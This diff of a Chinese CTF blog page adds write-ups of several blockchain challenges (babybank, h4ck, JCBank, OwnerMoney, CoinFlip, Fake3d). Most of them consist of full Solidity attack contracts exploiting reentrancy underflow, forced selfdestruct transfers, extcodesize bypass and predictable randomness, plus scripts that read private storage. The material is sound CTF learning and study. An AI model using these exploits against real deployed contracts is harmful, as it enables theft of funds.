@@ -128,18 +128,18 @@
   <nav class="site-state">
       <div class="site-state-item site-state-posts">
         <a href="/archives/">
-          <span class="site-state-item-count">13</span>
+          <span class="site-state-item-count">17</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
       <div class="site-state-item site-state-categories">
           <a href="/categories/">
-        <span class="site-state-item-count">2</span>
+        <span class="site-state-item-count">3</span>
         <span class="site-state-item-name">分类</span></a>
       </div>
       <div class="site-state-item site-state-tags">
           <a href="/tags/">
-        <span class="site-state-item-count">8</span>
+        <span class="site-state-item-count">12</span>
         <span class="site-state-item-name">标签</span></a>
       </div>
   </nav>
@@ -179,6 +179,435 @@
 
 
     <div class="main-inner index posts-expand">
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2022/06/28/%E5%8C%BA%E5%9D%97%E9%93%BE%E9%87%8D%E5%85%A5%E6%94%BB%E5%87%BB%E7%BB%83%E4%B9%A0/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="https://q1.qlogo.cn/g?b=qq&nk=1987356024&s=100">
+      <meta itemprop="name" content="Lorlike">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Lorlike's Blog">
+      <meta itemprop="description" content="ctfer/蒟蒻觅马🐶/炼丹">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="undefined | Lorlike's Blog">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2022/06/28/%E5%8C%BA%E5%9D%97%E9%93%BE%E9%87%8D%E5%85%A5%E6%94%BB%E5%87%BB%E7%BB%83%E4%B9%A0/" class="post-title-link" itemprop="url">区块链重入攻击练习</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2022-06-28 16:46:36" itemprop="dateCreated datePublished" datetime="2022-06-28T16:46:36+08:00">2022-06-28</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2022-06-29 17:26:45" itemprop="dateModified" datetime="2022-06-29T17:26:45+08:00">2022-06-29</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/note/" itemprop="url" rel="index"><span itemprop="name">note</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <h2 id="qwb2019-babybank">QWB2019 babybank</h2>
+<p><a
+target="_blank" rel="noopener" href="https://ethervm.io/decompile/ropsten/0xd630cb8c3bbfd38d1880b8256ee06d168ee3859c#func_profit">反编译</a>看一下</p>
+<p><strong>profit</strong>函数需要<strong>level==0</strong>地址后<strong>16</strong>位为<strong>0xb1b1</strong>，调用后<strong>level</strong>加<strong>1</strong>，结果为<strong>level=1</strong>，<strong>balance</strong>加<strong>1</strong>，结果为<strong>balance=1</strong></p>
+<p><strong>guess</strong>函数需要<strong>level==1</strong>和<strong>secret==arg0</strong>，调用后<strong>level</strong>加<strong>1</strong>，结果为<strong>level=2</strong>，<strong>balance</strong>加<strong>1</strong>，结果为<strong>balance=2</strong></p>
+<p><strong>func_045C</strong>函数可以修改<strong>secret</strong>，但是要<strong>msg.sender==owner</strong>，但没找到修改<strong>owner</strong>的地方，不能利用</p>
+<p><strong>transfer</strong>函数需要<strong>balance==2</strong>和<strong>arg0==2</strong>，把当前账号的<strong>balance</strong>转到指定地址</p>
+<p><strong>withdraw</strong>函数需要<strong>balance==2</strong>和<strong>arg0==2</strong>，有<strong>call.value</strong>函数可以利用<strong>callback</strong>重入攻击使<strong>balance</strong>下溢</p>
+<p>每个函数前都有</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">var1 = msg.value;</span><br><span class="line">if (var1) &#123; revert(memory[0x00:0x00]); &#125;</span><br></pre></td></tr></table></figure>
+<p>只能通过销毁其他合约来强制实现转账</p>
+<p><a
+target="_blank" rel="noopener" href="https://vanity-eth.tk/">爆破</a>账号以<strong>0xb1b1</strong>结尾</p>
+<p>对于<strong>secret</strong>，找到合约部署者和合约的修改<strong>secret</strong>的交易，可以找到<strong>secret</strong>的值，或者使用<strong>web3</strong>查找<strong>storage3</strong>的值，该值即为<strong>secret</strong></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> web3</span><br><span class="line"><span class="keyword">import</span> codecs</span><br><span class="line"></span><br><span class="line">w3=web3.Web3(web3.HTTPProvider(<span class="string">&quot;https://ropsten.infura.io/v3/54828bfa2cb14873a43512fd8d3fc24b&quot;</span>))</span><br><span class="line"></span><br><span class="line">a=w3.eth.get_storage_at(<span class="string">&quot;0xD630cb8c3bbfd38d1880b8256eE06d168EE3859c&quot;</span>,<span class="number">3</span>)</span><br><span class="line"><span class="built_in">print</span>(codecs.encode(a,<span class="string">&#x27;hex&#x27;</span>).decode())</span><br><span class="line"><span class="comment"># 0000000000000000000000000000000000000000000000000003fde42988fa35</span></span><br></pre></td></tr></table></figure>
+<p>给创建合约通过销毁合约强制给目标合约转账</p>
+<p>创建攻击合约，用之前的账号给合约转账，再调用合约进行攻击</p>
+<h3 id="攻击合约">攻击合约</h3>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">contract hacker&#123;</span><br><span class="line">    bool status;</span><br><span class="line">    babybank bb=babybank(0xD630cb8c3bbfd38d1880b8256eE06d168EE3859c);</span><br><span class="line"></span><br><span class="line">    function attack()&#123;</span><br><span class="line">        bb.withdraw(2);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function()payable &#123;</span><br><span class="line">        if(!status)&#123;</span><br><span class="line">            status=true;</span><br><span class="line">            bb.withdraw(2);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function payforflag(string md5ofteamtoken,string b64email)&#123;</span><br><span class="line">        bb.payforflag(md5ofteamtoken,b64email);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract A&#123;</span><br><span class="line">    address owner;</span><br><span class="line"></span><br><span class="line">    constructor()&#123;</span><br><span class="line">        owner=msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function getBalance()payable&#123;&#125;</span><br><span class="line"></span><br><span class="line">    function kill(address to)&#123;</span><br><span class="line">        require(owner==msg.sender);</span><br><span class="line">        selfdestruct(to);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h2 id="n1ctf2019-h4ck">N1CTF2019 h4ck</h2>
+<p>**_transfer<strong>是</strong>balanceOf**的转账函数，没有漏洞</p>
+<p><strong>transfer</strong>是**_transfer**外部调用方法</p>
+<p><strong>buy</strong>函数需要<strong>balanceOf==0</strong>，并且需要转入<strong>1wei</strong>，调用成功后调用者的<strong>sellTimes=1</strong>，<strong>balanceOf==1</strong></p>
+<p><strong>sell</strong>需要调用者<strong>balanceOf&gt;=amount</strong>，<strong>sellTimes&gt;0</strong>，且
+<strong>amount&gt;=100</strong>，<strong>call.value</strong>函数可以进行重入攻击，调用一次后<strong>sellTimes</strong>减<strong>1</strong>，重入让其下溢</p>
+<p>首先，转入<strong>200wei</strong>调用<strong>buy</strong>使其<strong>balanceOf==1</strong>，再调用<strong>transfer</strong>把当前的<strong>balanceOf</strong>转到指定账号中，如此循环薅羊毛使指定账号<strong>balanceOf</strong>达到<strong>200</strong></p>
+<p>把<strong>balanceOf</strong>的<strong>200</strong>转到攻击合约，利用<strong>callback</strong>调用两次<strong>sell</strong>使攻击合约的<strong>sellTimes</strong>下溢</p>
+<h3 id="攻击合约-1">攻击合约</h3>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">contract hacker&#123;</span><br><span class="line">    challenge c = challenge(0xE2d6d8808087D2e30EAdF0ACb67708148dbee0C0);</span><br><span class="line">    address wallet=0x3C5D01C380F8D8581bE8E3b5De0a8f35420f7D68;</span><br><span class="line">    bool public status;</span><br><span class="line"></span><br><span class="line">    function attack()payable&#123;</span><br><span class="line">        c.sell(100);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function hack1(uint times) payable&#123;</span><br><span class="line">        for(uint i=0;i&lt;times;i++)&#123;</span><br><span class="line">            c.buy.value(1)();</span><br><span class="line">            c.transfer(wallet,1);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function getValues()payable&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function winnerSubmit()payable&#123;</span><br><span class="line">        c.winnerSubmit();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function setStatus()&#123;</span><br><span class="line">        status=!status;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function()public payable&#123;</span><br><span class="line">        if(!status)&#123;</span><br><span class="line">            status=!status;</span><br><span class="line">            c.sell(100);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h2 id="hackergame2019-jcbank">Hackergame2019 JCBank</h2>
+<h3 id="flag1">flag1</h3>
+<p>直接利用<strong>web3</strong>脚本查看合约的<strong>storage</strong>的<strong>secret</strong>，再调用<strong>get_flag_1</strong>得到第一个<strong>flag</strong></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> web3</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">w3=web3.Web3(web3.HTTPProvider(<span class="string">&quot;https://kovan.infura.io/v3/xxx&quot;</span>))</span><br><span class="line">a=w3.eth.get_storage_at(<span class="string">&quot;0xE575c9abD35Fa94F1949f7d559056bB66FddEB51&quot;</span>,<span class="number">2</span>)</span><br><span class="line"><span class="built_in">print</span>(bytes_to_long(a))</span><br><span class="line"><span class="comment"># 1940577538063170034860903343625652396</span></span><br></pre></td></tr></table></figure>
+<h3 id="flag2">flag2</h3>
+<p>先调用<strong>deposit</strong>函数给目标合约转<strong>1wei</strong></p>
+<p>攻击合约也调用<strong>deposit</strong>给目标合约转<strong>1wei</strong>，此时攻击合约的<strong>balance</strong>为<strong>1</strong></p>
+<p>利用<strong>call.value</strong>的重入攻击调用两次<strong>withdraw</strong>，参数为<strong>1</strong>，因为到达<strong>call.value</strong>函数时，<strong>balance</strong>的值未变动，利用<strong>callback</strong>函数再调用<strong>withdraw</strong>使<strong>balance</strong>向下溢出</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">contract hacker&#123;</span><br><span class="line">    address owner;</span><br><span class="line">    bool status;</span><br><span class="line">    uint amount;</span><br><span class="line">    JCBank jcb=JCBank(0xE575c9abD35Fa94F1949f7d559056bB66FddEB51);</span><br><span class="line"></span><br><span class="line">    constructor()payable&#123;</span><br><span class="line">        owner=msg.sender;</span><br><span class="line">        jcb.deposit.value(msg.value)();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    modifier onlyOwner&#123;</span><br><span class="line">        require(msg.sender==owner);</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function attack(uint _amount)&#123;</span><br><span class="line">        amount = _amount;</span><br><span class="line">        jcb.withdraw(amount);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function get_flag_2(uint user_id)public onlyOwner&#123;</span><br><span class="line">        jcb.get_flag_2(user_id);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function Status()&#123;</span><br><span class="line">        status=!status;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function()public payable&#123;</span><br><span class="line">        if(!status)&#123;</span><br><span class="line">            status=!status;</span><br><span class="line">            jcb.withdraw(amount);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h2
+id="高校战疫网络安全分享赛2020-ownermoney">高校战疫网络安全分享赛2020
+OwnerMoney</h2>
+<p>先<a
+target="_blank" rel="noopener" href="https://ethervm.io/decompile/ropsten/0x40a590b70790930ceed4d148bf365eea9e8b35f4">反编译</a>合约</p>
+<p><strong>sell</strong>函数调用了<strong>call.value</strong>，需要参数<strong>amount&gt;=200</strong>，<strong>buyTimes&gt;0</strong>，调用者的<strong>balanceOf&gt;=amount</strong>，合约的**balance&gt;=_amount<strong>，调用后buyTimes减</strong>1**</p>
+<p>目标是调用<strong>payforflag</strong>，需要<strong>buyTimes&gt;=200</strong>，那么很明显利用<strong>call.value</strong>重入使<strong>buyTimes</strong>下溢即可完成攻击</p>
+<p><strong>buy</strong>函数可以使<strong>balanceOf=100</strong>，<strong>buyTimes=1</strong>，但需要调用者的地址的后<strong>12</strong>位为<strong>0xfff</strong>，且调用者为合约和需要<strong>1wei</strong></p>
+<p><strong>payforflag</strong>需要<strong>owner==msg.sender</strong>，利用下<strong>change</strong>和<strong>change_Owner</strong>把<strong>owner</strong>改为自己的地址</p>
+<p>我们可以爆破部署第一个合约满足条件的账号</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">from ethereum import utils</span><br><span class="line">import os</span><br><span class="line"></span><br><span class="line">def generate_eoa2():</span><br><span class="line">    priv = utils.sha3(os.urandom(4096))</span><br><span class="line">    addr = utils.checksum_encode(utils.privtoaddr(priv))</span><br><span class="line"></span><br><span class="line">    while not utils.decode_addr(utils.mk_contract_address(addr, 0)).endswith(&quot;fff&quot;):</span><br><span class="line">        priv = utils.sha3(os.urandom(4096))</span><br><span class="line">        addr = utils.checksum_encode(utils.privtoaddr(priv))</span><br><span class="line">        </span><br><span class="line">    print(&#x27;Address: &#123;&#125;\nPrivate Key: &#123;&#125;&#x27;.format(addr, priv.hex()))</span><br></pre></td></tr></table></figure>
+<p>参考pikachu师傅的脚本https://hitcxy.com/2020/generate-address/</p>
+<p>爆破出四个账号，把其中三个账号部署的合约的<strong>balanceOf</strong>转账到剩下的账号部署的合约中，就能满足<strong>sell</strong>的条件</p>
+<p>过程中发现目标合约没有<strong>balance</strong>，构造合约自销毁强转一些<strong>balance</strong></p>
+<h3 id="攻击合约-2">攻击合约</h3>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">contract A&#123;</span><br><span class="line">    OwnerMoney om = OwnerMoney(0x40a590b70790930ceed4d148bf365eea9e8b35f4);</span><br><span class="line">    constructor()payable&#123;</span><br><span class="line">        require(msg.value&gt;=1 wei);</span><br><span class="line">    &#125;</span><br><span class="line">    function attack(address to)&#123;</span><br><span class="line">        require(uint(to) &amp; 0xfff == 0xfff);</span><br><span class="line">        bool s = om.buy.value(1 wei)();</span><br><span class="line">        if(s)&#123;</span><br><span class="line">            om.transfer(to,100);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function kill()&#123;</span><br><span class="line">        selfdestruct(0x40a590b70790930ceed4d148bf365eea9e8b35f4);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract hacker&#123;</span><br><span class="line">    OwnerMoney om = OwnerMoney(0x40a590b70790930ceed4d148bf365eea9e8b35f4);</span><br><span class="line">    bool flag=true;</span><br><span class="line">    bool status;</span><br><span class="line">    constructor()payable&#123;</span><br><span class="line">        require(msg.value == 1 wei);</span><br><span class="line">        bool s = om.buy.value(1 wei)();</span><br><span class="line">        require(s==true);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function isOwner(address) view public returns (bool)&#123;</span><br><span class="line">        flag=!flag;</span><br><span class="line">        return flag;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function attack()&#123;</span><br><span class="line">        om.sell(200);</span><br><span class="line">        om.change(address(this));</span><br><span class="line">        om.change_Owner();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function payforflag(string b64email)&#123;</span><br><span class="line">        om.payforflag(b64email);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function()public payable&#123;</span><br><span class="line">        if(!status)&#123;</span><br><span class="line">            status=!status;</span><br><span class="line">            om.sell(200);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2022/06/27/%E5%8C%BA%E5%9D%97%E9%93%BEstorage%E5%AD%98%E5%82%A8%E5%86%99%E6%BC%8F%E6%B4%9E%E7%BB%83%E4%B9%A0/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="https://q1.qlogo.cn/g?b=qq&nk=1987356024&s=100">
+      <meta itemprop="name" content="Lorlike">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Lorlike's Blog">
+      <meta itemprop="description" content="ctfer/蒟蒻觅马🐶/炼丹">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="undefined | Lorlike's Blog">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2022/06/27/%E5%8C%BA%E5%9D%97%E9%93%BEstorage%E5%AD%98%E5%82%A8%E5%86%99%E6%BC%8F%E6%B4%9E%E7%BB%83%E4%B9%A0/" class="post-title-link" itemprop="url">区块链storage存储写漏洞练习</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2022-06-27 23:43:34" itemprop="dateCreated datePublished" datetime="2022-06-27T23:43:34+08:00">2022-06-27</time>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2022/06/27/%E5%8C%BA%E5%9D%97%E9%93%BE%E7%A9%BA%E6%8A%95%E7%BB%83%E4%B9%A0/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="https://q1.qlogo.cn/g?b=qq&nk=1987356024&s=100">
+      <meta itemprop="name" content="Lorlike">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Lorlike's Blog">
+      <meta itemprop="description" content="ctfer/蒟蒻觅马🐶/炼丹">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="undefined | Lorlike's Blog">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2022/06/27/%E5%8C%BA%E5%9D%97%E9%93%BE%E7%A9%BA%E6%8A%95%E7%BB%83%E4%B9%A0/" class="post-title-link" itemprop="url">区块链空投练习</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+      
+
+      <time title="创建时间：2022-06-27 02:50:36 / 修改时间：17:41:55" itemprop="dateCreated datePublished" datetime="2022-06-27T02:50:36+08:00">2022-06-27</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/note/" itemprop="url" rel="index"><span itemprop="name">note</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <h2 id="roarctf2019-coinflip">RoarCTF2019 CoinFlip</h2>
+<p>nc连接拿源码</p>
+<p>Ap：空投 Transfer：转账</p>
+<h3 id="攻击合约">攻击合约</h3>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">contract father&#123;</span><br><span class="line">    function attack(uint times)&#123;</span><br><span class="line">        for(uint i=0;i&lt;times;i++)&#123;</span><br><span class="line">            Son son = new Son();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Son&#123;</span><br><span class="line">    address pb=0xF60ADeF7812214eBC746309ccb590A5dBd70fc21;</span><br><span class="line">    address mywallet=0x3C5D01C380F8D8581bE8E3b5De0a8f35420f7D68;</span><br><span class="line">    constructor()public&#123;</span><br><span class="line">        P_Bank(pb).Ap();</span><br><span class="line">        uint amount = P_Bank(pb).balances(address(this));</span><br><span class="line">        P_Bank(pb).Transfer(mywallet,amount);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h2 id="bctf2018-fake3d">bctf2018 Fake3d</h2>
+<p><a
+target="_blank" rel="noopener" href="https://ropsten.etherscan.io/address/0x4082cC8839242Ff5ee9c67f6D05C4e497f63361a#code">拿源码</a></p>
+<p>airDrop：空投</p>
+<ol type="1">
+<li><p>空投函数生成的随机数依赖的是<strong>msg.sender</strong>，可以算出来</p></li>
+<li><p><strong>turingTest</strong>修饰器需要绕过<strong>extcodesize</strong>，合约的<strong>extcodesize</strong>不为0，但正在执行<code>构造函数constructor</code>并部署时extcodesize为0</p></li>
+<li><p>合约用<strong>tx.origin</strong>来发奖金，所以不需要转账，<strong>tx.origin</strong>指向调用源的账号，而<strong>msg.sender</strong>指向调用的账号或合约</p></li>
+</ol>
+<h3 id="攻击合约-1">攻击合约</h3>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">contract father&#123;</span><br><span class="line">    Son son;</span><br><span class="line">    function attack(uint times)&#123;</span><br><span class="line">        for(uint i=0;i&lt;times;i++)&#123;</span><br><span class="line">            son = new Son();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Son&#123;</span><br><span class="line">    using SafeMath for *;</span><br><span class="line">    constructor()&#123;</span><br><span class="line">        Fake3D f3=Fake3D(0x4082cC8839242Ff5ee9c67f6D05C4e497f63361a);</span><br><span class="line">        for (uint i = 0; i &lt; 900; i++) &#123;</span><br><span class="line">            uint256 seed = uint256(keccak256(abi.encodePacked(</span><br><span class="line">                (block.timestamp).add</span><br><span class="line">                (block.difficulty).add</span><br><span class="line">                ((uint256(keccak256(abi.encodePacked(block.coinbase)))) / (now)).add</span><br><span class="line">                (block.gaslimit).add</span><br><span class="line">                ((uint256(keccak256(abi.encodePacked(this)))) / (now)).add</span><br><span class="line">                (block.number)</span><br><span class="line">            )));</span><br><span class="line"></span><br><span class="line">            if((seed - ((seed / 1000) * 1000)) &lt; 288)&#123;</span><br><span class="line">                f3.airDrop();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
